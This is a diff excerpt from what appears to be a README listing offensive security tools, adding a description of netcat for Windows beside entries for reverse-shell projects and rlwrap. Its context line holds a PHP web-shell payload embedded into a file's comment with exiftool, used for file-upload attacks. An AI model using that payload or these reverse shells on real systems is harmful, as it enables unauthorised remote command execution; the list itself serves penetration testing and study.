@@ -416,8 +416,17 @@ exiftool -comment='<?php system($_GET['wr3nch']);?>' \<file_name\>.\<extension\>
   > Easy to remember reverse shell that should work on most Unix-like systems. <br>
   > Detects available software on the target and runs an appropriate payload.
   > ![](https://camo.githubusercontent.com/9ffdee4663ef22d343ebc88325a3f504e585669679942758485b215b1d7caa09/68747470733a2f2f692e696d6775722e636f6d2f71716a687841772e676966)
-- ## [netcat](https://github.com/diegocr/netcat)
+
+- ## [netcat](https://github.com/diegocr/netcat) NetCat for Windows
+  - Netcat for NT is the tcp/ip "Swiss Army knife" that never made it into any of the resource kits.  
+  - It has proved to be an extremely versatile tool on the unix platform. 
+  - So why should NT always be unix's poor cousin when it comes to tcp/ip testing and exploration?  
+  - I bet many NT admins out there keep a unix box around to use tools such as Netcat or to test their systems
+  - with the unix version of an NT vulnerability exploit.
+  - With Netcat for NT part of that feeling disempowerment is over.
+
 - ## [rlwrap](https://github.com/hanslub42/rlwrap)
+
 - ## [reverse-shell](https://github.com/medpaf/reverse-shell) Simple reverse shell written in Python.
   > ### This is a reverse shell written in Python used to to target a machine and gain remote shell access.
   > ![image](https://user-images.githubusercontent.com/51442719/174809460-6991dd33-eb8b-4341-9f65-1bdf6e180eec.png)
